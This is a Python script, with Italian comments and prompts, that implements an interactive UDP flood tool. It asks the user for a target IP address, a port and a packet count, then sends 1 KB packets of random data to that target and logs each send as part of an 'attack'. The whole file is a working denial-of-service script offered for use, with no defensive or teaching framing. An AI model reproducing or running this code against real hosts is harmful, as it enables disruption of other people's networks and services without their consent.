import logging
import os
import socket
from datetime import datetime


class UDPClient:
    def __init__(self, ip_target, porta_target, dimensione_pacchetto, numero_pacchetti):
        """Inizializzazione del client UDP con IP target, porta target, dimensione del pacchetto e numero di pacchetti."""
        self.ip_target = ip_target
        self.porta_target = porta_target
        self.dimensione_pacchetto = dimensione_pacchetto
        self.numero_pacchetti = numero_pacchetti
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    def invia_pacchetti(self):
        """Invia i pacchetti UDP al target."""
        messaggio = os.urandom(
            self.dimensione_pacchetto
        )  # Genera un pacchetto di dati casuali di 1 KB
        logging.info(
            f"Inizio attacco UDP flood verso {self.ip_target}:{self.porta_target} con {self.numero_pacchetti} pacchetti da {self.dimensione_pacchetto} byte."
        )

        for i in range(self.numero_pacchetti):
            try:
                self.socket.sendto(messaggio, (self.ip_target, self.porta_target))
                logging.info(
                    f"Inviato pacchetto {i+1} a {self.ip_target}:{self.porta_target}"
                )
            except Exception as e:
                logging.error(f"Errore durante l'invio del pacchetto {i+1}: {e}")

        logging.info("Attacco completato.")

    def chiudi_socket(self):
        """Chiude il socket."""
        self.socket.close()


def configura_logging():
    """Configura il logging per l'applicazione."""
    nome_file_log = f"udp_flood_client_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
    logging.basicConfig(
        filename=nome_file_log,
        level=logging.INFO,
        format="%(asctime)s - %(levelname)s - %(message)s",  # Formato di log in inglese per evitare errori
        datefmt="%Y-%m-%d %H:%M:%S",
    )
    console = logging.StreamHandler()
    console.setLevel(logging.INFO)
    formatter = logging.Formatter(
        "%(asctime)s - %(levelname)s - %(message)s"
    )  # Formato di log in inglese per evitare errori
    console.setFormatter(formatter)
    logging.getLogger("").addHandler(console)


def valida_ip(ip):
    """Valida l'indirizzo IP inserito."""
    parti = ip.split(".")
    if len(parti) != 4:
        return False
    for parte in parti:
        if not parte.isdigit():
            return False
        if not 0 <= int(parte) <= 255:
            return False
    return True


def valida_porta(porta):
    """Valida il numero di porta inserito."""
    return porta.isdigit() and 1 <= int(porta) <= 65535


def main():
    configura_logging()
    logging.info("Avvio del programma UDP Flood")

    while True:
        ip_target = input("Inserisci l'IP target: ").strip()
        if valida_ip(ip_target):
            break
        else:
            logging.warning("Indirizzo IP non valido. Riprova.")

    while True:
        porta_target = input("Inserisci la porta target: ").strip()
        if valida_porta(porta_target):
            porta_target = int(porta_target)
            break
        else:
            logging.warning("Numero di porta non valido. Riprova.")

    dimensione_pacchetto = 1024  # 1 KB

    while True:
        try:
            numero_pacchetti = int(
                input("Quanti pacchetti da 1 KB vuoi inviare? ").strip()
            )
            if numero_pacchetti > 0:
                break
            else:
                logging.warning(
                    "Il numero di pacchetti deve essere un intero positivo. Riprova."
                )
        except ValueError:
            logging.warning("Input non valido. Inserisci un numero intero.")

    client = UDPClient(ip_target, porta_target, dimensione_pacchetto, numero_pacchetti)
    client.invia_pacchetti()
    client.chiudi_socket()


if __name__ == "__main__":
    main()
